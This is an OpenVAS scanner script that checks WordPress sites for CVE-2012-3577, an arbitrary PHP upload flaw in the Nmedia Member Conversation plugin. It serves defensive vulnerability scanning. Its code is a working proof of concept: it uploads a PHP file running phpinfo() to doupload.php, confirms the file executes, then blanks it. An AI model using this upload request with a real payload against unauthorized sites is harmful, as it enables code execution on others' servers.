##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_nmedia_member_conv_file_upload_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# WordPress Nmedia Member Conversation Plugin Arbitrary File Upload Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to upload arbitrary PHP code
  and run it in the context of the Web server process.
  Impact Level: System/Application";
tag_affected = "WordPress Nmedia Member Conversation Plugin version 1.35.0";
tag_insight = "The flaw is due to the /wp-content/plugins/wordpress-member-private-
  conversation/doupload.php script allowing the upload of files with arbitrary
  extensions to a folder inside the webroot. This can be exploited to execute
  arbitrary PHP code by uploading a malicious PHP script.";
tag_solution = "Upgrade to WordPress Nmedia Member Conversation Plugin version 1.4 or later,
  For updates refer to http://wordpress.org/extend/plugins/wordpress-member-private-conversation/";
tag_summary = "This host is running WordPress Nmedia Member Conversation Plugin
  and is prone to file upload vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802642";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 12 $");
  script_bugtraq_id(53790);
  script_cve_id("CVE-2012-3577");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-06-20 12:12:12 +0530 (Wed, 20 Jun 2012)");
  script_name("WordPress Nmedia Member Conversation Plugin Arbitrary File Upload Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/82792");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/49375");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/76076");
  script_xref(name : "URL" , value : "http://wordpress.org/extend/plugins/wordpress-member-private-conversation/changelog/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/113287/WordPress-Nmedia-WP-Member-Conversation-1.35.0-Shell-Upload.html");
  script_xref(name : "URL" , value : "http://www.opensyscom.fr/Actualites/wordpress-plugins-nmedia-wordpress-member-conversation-shell-upload-vulnerability.html");

  script_description(desc);
  script_summary("Check if Nmedia Member Conversation Plugin is vulnerable to arbitrary file upload");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


function upload_file(url, file, ex, len)
{
  return string(

  "POST ", url, " HTTP/1.1\r\n",
  "Host: ", get_host_name(), "\r\n",
  "Content-Type: multipart/form-data; boundary=---------------------------5626d00351af\r\n",
  "Content-Length: ", len, "\r\n\r\n",
  "-----------------------------5626d00351af\r\n",
  'Content-Disposition: form-data; name="Filedata"; filename="',file,'";',"\r\n",
  "Content-Type: application/octet-stream\r\n",
  "\r\n",
  ex,"\r\n",
  "-----------------------------5626d00351af--\r\n\r\n"

  );
}

## Variable Initialization
req = "";
res = "";
port = 0;

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);


## Check Port State
if(! get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(! can_host_php(port: port)){
  exit(0);
}

## Get WordPress Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);


## Construct attack request
file = "ov-file-upload-test.php";
rand = rand();
ex = "<?php echo " + rand + "; phpinfo(); die; ?>";
len = strlen(ex) + 219;
url = string(dir, "/wp-content/plugins/wordpress-member-private-conversation",
                  "/doupload.php");
req = upload_file(url:url, file:file, ex:ex, len:len);

## Uploading File Containing Exploit
res = http_keepalive_send_recv(port: port, data: req);

if(res && res =~ "HTTP/1.. 200")
{
  ## Get the contents of uploaded file
  path = string(dir, "/wp-content/uploads/user_uploads/", file);

  ## Confirm exploit worked by checking the response
  if(http_vuln_check(port:port, url:path, check_header:TRUE,
     pattern:"<title>phpinfo\(\)", extra_check:rand))
  {
    ## Clean up the exploit
    ex = "";
    len = strlen(ex) + 219;
    req = upload_file(url:url, file:file, ex:ex, len:len);

    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    security_hole(port:port);
    exit(0);
  }
}
